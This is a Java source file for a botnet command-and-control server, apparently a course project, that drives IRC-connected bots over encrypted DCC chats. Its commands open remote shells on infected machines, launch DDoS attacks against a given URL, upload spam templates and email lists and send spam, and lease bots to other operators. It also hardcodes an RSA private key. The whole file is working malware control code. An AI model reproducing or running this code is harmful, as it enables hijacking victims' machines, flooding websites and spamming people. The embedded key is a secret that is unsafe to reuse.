import java.io.*;
import java.util.*;
import org.jibble.pircbot.*;

/**
 * This is the BotnetServer class, it serve as the command and control interface for the bot master.
 * There are several commands available to the user including
 * <dl>
 * 		<dt>Help</dt>
 * 			<dd> Prints out the available commands <br/>
 * 				Usage: help
 * 			</dd>
 * 		<dt>Names</dt>
 * 			<dd> Prints out the nicks of all bots running on the IRC server <br/>
 * 				Usage: names
 * 			</dd>
 * 		<dt>Remote shell</dt>
 * 			<dd> One must give the command "exit" to leave the shell again, if you must type "exit" but don't wish to leave simply append a space <br/>
 * 				Usage: shell botNick [timeout]
 * 			</dd>
 * 		<dt>Distributed Denial of Service</dt>
 * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
 * 				Usage: ddos url interval duration bot [more bots]
 * 			</dd>
 * 		<dt>Spam File Upload</dt>
 * 			<dd> One can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names "template.txt" or "emails.txt".
 * 				 You can specify specific bots to send the files to or you can give 'all' to send the file to all available bots. 
 * 				The template file must contain unique 'XXX', 
 * 				'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line. <br/>
 * 				Usage: spamupload templateFile emailFile bot [more bots]
 * 			</dd>
 * 		<dt>Spam</dt>
 * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields (must be wrapped in single quotes in command) in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
 * 				The spam will be sent from the given address to the given recipients.
 * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
 * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
 * 				the number will not be respected if it exceeds the size of the botnet.
 * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' 'subject' recipient [more recipients]
 * 			</dd>
 * 		<dt>Lease</dt>
 * 			<dd> Allows you to lease some or all of your bots to a particular BotnetLeaseServer bot node. The duration is in milliseconds. One can specify using all the bots with 'all' or a number of bots or a list of bot nicks.
 * 				Usage: lease leaseMaster duration bot [more bots]
 * 			</dd>
 * 		<dt>Kill</dt>
 * 			<dd> One can specify a list of bot nicks or just say all. This command simply stops the bot process, 
 * 				but it will start again when the user restarts his/her machine.
 * 				Usage: kill bot [more bots]
 * 			</dd>
 * 		<dt>Eradicate</dt>
 * 			<dd> One can specify a list of bot nicks or just say all. The eradicate command kills the bot 
 * 				process and runs the cleaning script provided.
 * 				Usage: eradicate cleanURL bot [more bots]
 * 			</dd>
 * </dl>
 * 
 * @author Roy McElmurry, Robert Johnson
 */
public class BotnetServer extends PircBot {	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final boolean DEBUG = false;
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private Map<String, MsgEncrypt> botKeys;
	
	private MsgEncrypt m;
	
	private static final String rsaPrivateExp = "71297784175965835129840380767799164802935470319035078256080196093715404322248709184148527780402381402614554597184454624893606179190140937773510113822903233272610610852846100680912323528491646248547292219752408338128335385639782016184316596955228926230719596592082572925879510080781616710237803932128786341473";
	private static final String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";

	public static void main(String[] args) {
		new BotnetServer();
	}
	
	/**
	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
	 */
	public BotnetServer() {
		m = MsgEncrypt.getInstance();
		m.genRSAPrivKey(rsaMod + " " + rsaPrivateExp);
		input = new Scanner(System.in);
		try {
			botKeys = new HashMap<String, MsgEncrypt>();
			
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			connect(SERVER, PORT);			
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
		setMode(CHANNEL, "s");
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			if (!bots[i].getNick().equals(NAME)) {
				if (bots[i].getNick().startsWith("bot")) {
					System.out.print("\t" + bots[i].toString());
					handshake(bots[i].getNick());
				} else {
					System.out.println("\t" + bots[i].toString());
				}
			}
		}
		init();
	}
	
	private void handshake(String name) {
		PubInfo info = MsgEncrypt.getPubParams();
		MsgEncrypt m2 = MsgEncrypt.getInstance();
		m2.setPubParams(info.toString());
		try { 
			DccChat chat = dccSendChatRequest(name, TIMEOUT);
			if (chat == null) {
				System.out.println("\tThe chat request was rejected.");
			} else {
				chat.sendLine(m.encryptRSA("key"));
				//Send Key
				chat.sendLine(m.encryptRSA(m2.getStrKey()));
				//Send public info
				chat.sendLine(m.encryptRSA(info.toString()));
				//Get public key
				String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
				m2.handShake(otherKey);
				botKeys.put(name, m2);
				chat.close();
				System.out.println(" (secure)");
			}
		} catch (Exception e) {
			System.out.println(" (insecure)");
		}
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println("\t" + channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
		System.out.println(sender + ": " + message);
	}
	
	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
		if (e != null) {
			System.out.println("\tThere was a problem trasferring the file\n\t" + e.getMessage());
		} else {
			String fileName = transfer.getFile().getName();
			System.out.println("\tSuccessfully delivered " + fileName + " to " + transfer.getNick());
		}
	}
	
	/**
	 * Reads input from the user and handles the command.
	 */
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			try {
				performCommand(message);
				System.out.print("Command: ");
				message = input.nextLine();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private int getNonce(String bot) {
		try {
			DccChat chat = dccSendChatRequest(bot, TIMEOUT);
			chat.sendLine("nonce");
			int nonce = Integer.parseInt(chat.readLine());
			System.out.println("server recieved nonce:" + nonce);
			chat.close();
			return nonce;
		} catch (Exception e) {
			return getNonce(bot);
		}
	}
	
	/** 
	 * <p>If s is a recognized command, the corresponding action is taken, 
	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
	 * and finally if it is not a command or a private message to the channel then it is sent 
	 * as a raw message the IRC server.</p>
	 * 
	 * @param s A command/message to be interpreted
	 */
	public void performCommand(String s) throws Exception {
		//Respond to a help command with a shit ton of printlns.
		if (s.toLowerCase().equalsIgnoreCase("help")) {
			printHelp();
		//Respond to a names command by getting the user on CHANNEL and printing their nicks
		} else if (s.toLowerCase().equals("names")) {
			User[] bots = this.getUsers(CHANNEL);
			for (User bot : bots) {
				System.out.println("\t" + bot.getNick());
			}
		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
			acquireOpStatus();
		} else if (s.toLowerCase().startsWith("lease")) {
			//lease leaseMaster duration bot [more bots]
			String[] parts = s.split(" ");
			if (parts.length > 3) {
				String leaseMaster = parts[1];
				long duration = Long.parseLong(parts[2]);
				String[] bots = chooseBots(parts, 3);
				DccChat chat = this.dccSendChatRequest(leaseMaster, TIMEOUT);
				String botNames = bots[0];
				for (int i = 1; i < bots.length; i++) {
					botNames += " " + bots[i];
				}
				chat.sendLine(m.encryptRSA("lease " + botNames));
				String leasedPubInfo = chat.readLine();
				for (String name : bots) {
					DccChat botChat = this.dccSendChatRequest(name, TIMEOUT);
					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey", getNonce(name)));
					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster, getNonce(name)));
					botChat.sendLine(botKeys.get(name).encryptMsg(duration + ""));
					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo));
					if (!botKeys.get(name).decryptMsg(botChat.readLine()).equals("leased")) {
						System.out.println("\tThere was an issue leasing " + name);
					}
					botChat.close();
				}
				chat.sendLine(m.encryptRSA("leased"));
				chat.close();
			} else {
				System.out.println("Usage: lease leaseMaster duration bot [more bots]");
			}
		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("\tUsage: shell botNick [timeout]");
			}
		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
		} else if (s.toLowerCase().startsWith("ddos")) {
			String[] parts = s.split(" ");
			if (parts.length < 5) {
				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 4);
				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
				for (String name : botNames) {
					if (!name.equals(NAME)) {
						this.sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
					}
				}
			}
		//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
		} else if (s.toLowerCase().startsWith("spamupload")) {
			String[] parts = s.split(" ");
			if (parts.length < 4) {
				System.out.println("Usage: spamupload template emails bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 3);
				for (String name : botNames) {
					if (!name.equals(NAME)) {
						dccSendFile(new File(parts[1]), name, TIMEOUT);
						dccSendFile(new File(parts[2]), name, TIMEOUT);
					}
				}
			}
		//Respond to spam command by selecting numbots bots and issuing the command	
		} else if (s.toLowerCase().startsWith("spam")) {
			try {
				String[] peices = s.split("'");
				String[] firstArgs = peices[0].trim().split(" ");
				String[] lastArgs = peices[8].split(" ");
				lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
				
				List<String> list = new ArrayList<String>();
				for (String arg : firstArgs) {
					list.add(arg);
				}
				list.add("'" + peices[1] + "'");
				list.add("'" + peices[3] + "'");
				list.add("'" + peices[5] + "'");
				list.add("'" + peices[7] + "'");
				for (String arg : lastArgs) {
					list.add(arg);
				}
				
				String[] parts = list.toArray(new String[0]);
				
				if (parts.length < 7) {
					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
				} else {
					String[] bots = getUserNames();
					if (!parts[1].equalsIgnoreCase("all")) {
						int numBots = Integer.parseInt(parts[1]);
						if (bots.length > numBots) {
							bots = Arrays.copyOfRange(bots, 0, numBots + 1);
						}
					}
					String command = parts[0];
					for (int i = 2; i < parts.length; i++) {
						command += " " + parts[i];
					}
					for (String name : bots) {
						sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
			}
		//Respond to a kill command by sending it to the bots
		} else if (s.toLowerCase().startsWith("kill")) {
			String[] parts = s.split(" ");
			if (parts.length < 2) {
				System.out.println("\tUsage: kill bot [more bots]");
			} else {
				String[] bots = chooseBots(parts, 1);
				for (String name : bots) {
					sendMessage(name, botKeys.get(name).encryptMsg(parts[0], getNonce(name)));
				}
			}
		//Respond to an eradicate command by sending it along with the clean script url to each bot
		} else if (s.toLowerCase().startsWith("eradicate")) {
			String[] parts = s.split(" ");
			if (parts.length < 3) {
				System.out.println("\tUsage: eradicate cleanScript bot [more bots]");
			} else {
				String[] bots = chooseBots(parts, 2);
				for (String name : bots) {
					String command = parts[0] + " " + parts[1];
					sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
				}
			}
		//Respond to a message beginning with a colon by messaging the CHANNEL
		} else if (s.startsWith(":")) {
			User[] bots = getUsers(CHANNEL);
			for (User bot : bots) {
				if (botKeys.containsKey(bot.getNick())) {
					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1), getNonce(bot.getNick())));
				}
			}
		//Respond to all other messages by sending the message raw to the IRC server
		} else if (!s.isEmpty()) {
			sendRawLine(s);
		}
	}
	
	public String[] chooseBots(String[] arr, int index) {
		if (arr[index].equalsIgnoreCase("all")) {
			return getUserNames();
		} else {
			try {
				int numBots = Integer.parseInt(arr[index]);
				String[] names = getUserNames();
				if (numBots > names.length) {
					return names;
				} else {
					return Arrays.copyOfRange(names, 0, numBots);
				}
			} catch (Exception e) {
				return Arrays.copyOfRange(arr, index, arr.length);
			}
		}
	}
	
	public String[] getUserNames() {
		User[] bots = getUsers(CHANNEL);
		List<String> namesList = new ArrayList<String>();
		for (User bot : bots) {
			if (!bot.getNick().equalsIgnoreCase(NAME) && bot.getNick().startsWith("bot")) {
				namesList.add(bot.getNick());
			}
		}
		return namesList.toArray(new String[0]);
	}
	
	/**
	 * Gives the CC bot operator status and then removes it from all other bots.
	 */
	private void acquireOpStatus() {
		op(CHANNEL, NAME);
		User[] bots = getUsers(CHANNEL);
		for (int i = 0; i < bots.length; i++) {
			System.out.println(bots[i].getNick());
			if (!bots[i].getNick().equals(NAME)) {
				deOp(CHANNEL, bots[i].toString());
			}
		}
		op(CHANNEL, NAME);
	}
	
	/**
	 * Prints out a help message that describes available functionality and commands.
	 */
	private void printHelp() {
		System.out.println("\tHelp");
		System.out.println("\t\tPrints out the available commands");
		System.out.println("\t\tUsage: help");
		System.out.println("\tNames");
		System.out.println("\t\tPrints out the nicks of all bots running on the IRC server");
		System.out.println("\t\tUsage: names");
		System.out.println("\tRemote shell");
		System.out.println("\t\tOne must give the command \"exit\" to leave the shell again, if you must type \"exit\" but don't wish to leave simply append a space");
		System.out.println("\t\tUsage: shell botNick [timeout]");
		System.out.println("\tDistributed Denial of Service");
		System.out.println("\t\tOne can specify by nick and number of bots to have participate or simply say \"all\" for the first bot nick to have all bots participate");
		System.out.println("\t\tddos url interval duration bot [more bots]");
		System.out.println("\tSpam File Upload");
		System.out.println("\t\tOne can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names \"template.txt\" or \"emails.txt\".");
		System.out.println("\t\tYou can specify specific bots to send the files to or you can give 'all' to send the file to all available bots.");
		System.out.println("\t\tThe template file must contain unique 'XXX', ");
		System.out.println("\t\t'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line.");
		System.out.println("\t\tUsage: spamupload templateFile emailFile bot [more bots]");
		System.out.println("\tSpam");
		System.out.println("\t\tOne can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word."); 
		System.out.println("\t\tThe spam will be sent from the given address to the given recipients.");
		System.out.println("\t\tGiving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to");
		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
		System.out.println("\t\tUsage: spam numBots xxx yyy zzz subject recipient [more recipients]");
	}
	
	/**
	 * Establishes a DCC chat with the specified bot for the purpose of creating a remote shell.
	 * Feeds commands to the bot and prints out responses.
	 */
	private void engageInChat(String botNick, int timeout) {
		DccChat chat = dccSendChatRequest(botNick, timeout);
		if (chat == null) {
			System.out.println("The chat request was rejected.");
		} else {
			Scanner input = new Scanner(System.in);
			Scanner shellout = new Scanner(chat.getBufferedReader());
			
			try {
				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
				System.out.print(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
				String command = input.nextLine();
				while (!command.equalsIgnoreCase(TERMINATION)) {
					chat.sendLine(botKeys.get(botNick).encryptMsg(command));
					String response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
					while (!response.endsWith(SENTINEL)) {
						System.out.println("\t" + response);
						response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
					}
					System.out.print(response);
					command = input.nextLine();
				}
				chat.sendLine(botKeys.get(botNick).encryptMsg(command));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
